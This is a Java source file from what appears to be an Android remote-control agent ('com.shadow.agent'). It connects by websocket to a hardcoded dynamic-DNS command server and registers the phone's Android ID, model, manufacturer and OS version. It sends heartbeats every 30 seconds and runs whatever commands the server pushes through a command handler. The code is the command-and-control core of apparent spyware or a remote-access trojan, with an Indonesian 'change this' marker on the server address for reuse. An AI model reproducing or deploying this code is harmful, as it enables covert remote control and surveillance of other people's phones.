package com.shadow.agent;

import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import io.socket.client.IO;
import io.socket.client.Socket;

import java.net.URISyntaxException;

public class SocketManager {

    // ========== GANTI INI ==========
    private static final String SERVER_URL = "http://zuraaparker.duckdns.top:3975";
    private static final String REGISTER_CODE = ""; // opsional
    // ===============================

    private static final String TAG = "SHADOW_AGENT";

    private final Context context;
    private Socket socket;
    private CommandHandler cmdHandler;

    public SocketManager(Context context) {
        this.context = context;
        this.cmdHandler = new CommandHandler(context);
    }

    public void connect() {
        try {
            IO.Options opts = new IO.Options();
            opts.transports = new String[]{"websocket"};
            opts.reconnection = true;
            opts.reconnectionDelay = 3000;

            socket = IO.socket(SERVER_URL, opts);

            socket.on(Socket.EVENT_CONNECT, args -> {
                Log.d(TAG, "Connected to server");
                register();
            });

            socket.on(Socket.EVENT_DISCONNECT, args -> Log.d(TAG, "Disconnected"));

            socket.on("command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String cmdId = data.getString("cmdId");
                    String command = data.getString("command");
                    JSONObject params = data.optJSONObject("params");
                    Log.d(TAG, "Command: " + command);
                    cmdHandler.handle(cmdId, command, params, socket);
                } catch (Exception e) {
                    Log.e(TAG, "Cmd error", e);
                }
            });

            socket.on("agent:registered", args -> Log.d(TAG, "Registered: " + args[0].toString()));

            socket.connect();

        } catch (URISyntaxException e) {
            Log.e(TAG, "Socket URL error", e);
        }
    }

    private void register() {
        try {
            String deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

            JSONObject data = new JSONObject();
            data.put("device_code", deviceId);
            data.put("model", Build.MODEL);
            data.put("manufacturer", Build.MANUFACTURER);
            data.put("android_version", Build.VERSION.RELEASE);
            data.put("sdk", String.valueOf(Build.VERSION.SDK_INT));
            if (!REGISTER_CODE.isEmpty()) data.put("registerCode", REGISTER_CODE);

            socket.emit("agent:register", data);

            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (socket != null && socket.connected()) socket.emit("agent:heartbeat");
                    new Handler(Looper.getMainLooper()).postDelayed(this, 30000);
                }
            }, 30000);

        } catch (Exception e) {
            Log.e(TAG, "Register error", e);
        }
    }

    public void disconnect() {
        if (socket != null) {
            socket.disconnect();
            socket = null;
        }
    }
}